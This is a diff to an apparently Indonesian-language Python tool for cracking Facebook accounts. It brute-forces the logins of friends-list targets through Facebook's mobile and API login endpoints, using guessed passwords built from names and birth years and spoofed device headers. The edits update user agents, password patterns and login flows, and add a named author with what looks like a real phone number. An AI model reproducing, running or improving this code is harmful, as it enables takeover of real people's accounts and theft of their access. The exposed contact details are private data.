@@ -22,9 +22,9 @@ from rich.markdown import Markdown as mark
 from rich.columns import Columns as col
 # UA LIST
 try:ugen = open('user.txt','r').read().splitlines()
-except:ugen = ['Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36']
+except:ugen = ['Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996']
 try:ugen2 = open('user2.txt','r').read().splitlines()
-except:ugen2 = ['Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36']
+except:ugen2 = ['Mozilla/5.0 (Linux; Android 10; M2006C3LG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36']
 
 # INDICATION
 id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
@@ -58,7 +58,7 @@ def banner():
 	wel = '# WELCOME TO FACEBOOK WORLD TOOLS 2022'
 	wel2 = mark(wel, style='cyan')
 	sol().print(wel2)
-	au='AUTHOR    :  LibyaPro \nGITHUB    :  https://github.com/Libya.pro\nWHATSAPP  :  092+++++++'
+	au='AUTHOR    :  Ahmed Alzwage \nGITHUB    :  https://github.com/Libya.pro\nWHATSAPP  :  0921762445'
 	pengembang1=nel(au,style="cyan")
 	cetak(nel(pengembang1, title='INFORMASI PENGEMBANG'))
 
@@ -70,7 +70,8 @@ def login():
 			try:
 				sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])
 				sy2 = json.loads(sy.text)['name']
-				menu(sy2)
+				sy3 = json.loads(sy.text)['id']
+				menu(sy2,sy3)
 			except KeyError:
 				login_lagi()
 			except requests.exceptions.ConnectionError:
@@ -92,7 +93,7 @@ def login_lagi():
 	akun=open('.token.txt','w').write(panda)
 	try:
 		tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
-		tes3 = json.loads(tes.text)['name ']
+		tes3 = json.loads(tes.text)['id']
 		sue = '# Login Sukses, Tunggu Sebentar!'
 		suu = mark(sue, style='green')
 		sol().print(suu, style='cyan')
@@ -110,7 +111,7 @@ def login_lagi():
 		sol().print(lo, style='cyan')
 		exit()
 # MENU
-def menu(my_name):
+def menu(my_name,my_id):
 	try:sh = requests.get('https://httpbin.org/ip').json()
 	except:sh = {'origin':'-'}
 	try:
@@ -124,8 +125,8 @@ def menu(my_name):
 	fx = mark(sg, style='green')
 	sol().print(fx)
 	print(x+'['+h+'•'+x+'] Active User : '+str(my_name))
-	print(x+'['+h+'•'+x+'] User Id     : '+str())
-	print(x+'['+h+'•'+x+'] User Ttl    : '+str())
+	print(x+'['+h+'•'+x+'] User Id     : '+str(my_id))
+	print(x+'['+h+'•'+x+'] User Ttl    : '+str(birth))
 	print(x+'['+h+'•'+x+'] Ip Address  : '+str(sh['origin']))
 	io = '[01] Crack Dari Pertemanan Publik\n[02] Crack Dari Pertemanan Publik (Massal)\n[03] Cek Result Crack\n[04] Cek Opsi Checkpoint\n[00] Log Out'
 	oi = nel(io, style='cyan')
@@ -467,23 +468,19 @@ def passwrd():
 		for yuzong in id2:
 			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
 			frs = nmf.split(' ')[0]
-			pwv = ['1122334455','1234554321','112233445566','123456654321']
+			pwv = ['1122334455','1234554321','112233445566','123456654321','20002000','20012001','20022002','19991999']
 			if len(nmf)<6:
 				if len(frs)<3:
 					pass
 				else:
 					pwv.append(frs+'123')
 					pwv.append(frs+'12345')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'123456')
 			else:
 				if len(frs)<3:
 					pwv.append(nmf)
 				else:
 					pwv.append(nmf)
 					pwv.append(frs+'123')
-					pwv.append(frs+'1234')
-					pwv.append(frs+'123456')
 					pwv.append(frs+'12345')
 			if 'mobile' in method:
 				pool.submit(crack,idf,pwv)
@@ -553,8 +550,8 @@ def crack(idf,pwv):
 					user=idf
 					infoakun = ""
 					session = requests.Session()
-					cek =session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
-					cek2 = session.get("https://m.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
+					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
+					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
 					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
 						infoakun += (f"Aplikasi Yang Terkait*\n")
 						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
@@ -603,7 +600,7 @@ def crack2(idf,pwv):
 	ses = requests.Session()
 	for pw in pwv:
 		try:
-			head = {"x-fb-connection-bandwidth": str(random.randint(2000000.0, 4000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
+			head = {"x-fb-connection-bandwidth": str(random.randint(20000, 40000)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": ua, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
 			resp = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(idf)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=head)
 			if "m.facebook.com" in resp.json()["error_msg"]:
 				if 'ya' in oprek:
@@ -615,7 +612,7 @@ def crack2(idf,pwv):
 					akun.append(idf+'|'+pw)
 					cp+=1
 				break
-			elif "session_key" in resp.text and "EAAB" in resp.text:
+			elif "session_key" in resp.text and "EAAA" in resp.text:
 				print('\r%s++++ %s|%s ----> OK       '%(h,idf,pw))
 				open('OK/'+okc,'a').write(idf+'|'+pw+'\n')
 				ok+=1
@@ -638,11 +635,32 @@ def crack3(idf,pwv):
 	for pw in pwv:
 		try:
 			tix = time.time()
-			ses.headers.update({"Host":'mbaisc.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbaisc.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-			p = ses.get('https://mbaisc.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
-			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
-			ses.headers.update({"Host":'mbaisc.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
-			po = ses.post('https://mbaisc.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
+			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
+			p = ses.get('https://mbasic.facebook.com/login/?email='+idf).text
+			dataa ={
+'lsd':re.search('name="lsd" value="(.*?)"', str(p)).group(1),
+'jazoest':re.search('name="jazoest" value="(.*?)"', str(p)).group(1),
+'m_ts':re.search('name="m_ts" value="(.*?)"', str(p)).group(1),
+'li':re.search('name="li" value="(.*?)"', str(p)).group(1),
+'email':idf,
+'pass':pw
+}
+			ses.headers.update({'Host': 'mbasic.facebook.com',
+'cache-control': 'max-age=0',
+'upgrade-insecure-requests': '1',
+'origin': 'https://mbasic.facebook.com',
+'content-type': 'application/x-www-form-urlencoded',
+'user-agent': ua,
+'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+'sec-fetch-site': 'same-origin',
+'sec-fetch-mode': 'cors',
+'sec-fetch-user': 'empty',
+'sec-fetch-dest': 'document',
+'referer': 'https://mbasic.facebook.com/login/?email='+idf,
+'accept-encoding':'gzip, deflate br',
+'accept-language':'ar-AR,en-US;q=0.9,en;q=0.8'})
+
+			po = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?shbl=1&refsrc=deprecated',data=dataa,allow_redirects=False)
 			if "checkpoint" in po.cookies.get_dict().keys():
 				if 'ya' in oprek:
 					akun.append(idf+'|'+pw)
@@ -675,8 +693,8 @@ def crack3(idf,pwv):
 					user=idf
 					infoakun = ""
 					session = requests.Session()
-					cek =session.get("https://mbaisc.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki).text
-					cek2 = session.get("https://mbaisc.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki).text
+					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki).text
+					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki).text
 					if "Diakses menggunakan Facebook" in re.findall("\<title\>(.*?)<\/title\>",str(cek)):
 						infoakun += (f"Aplikasi Yang Terkait*\n")
 						if "Anda tidak memiliki aplikasi atau situs web aktif untuk ditinjau." in cek:
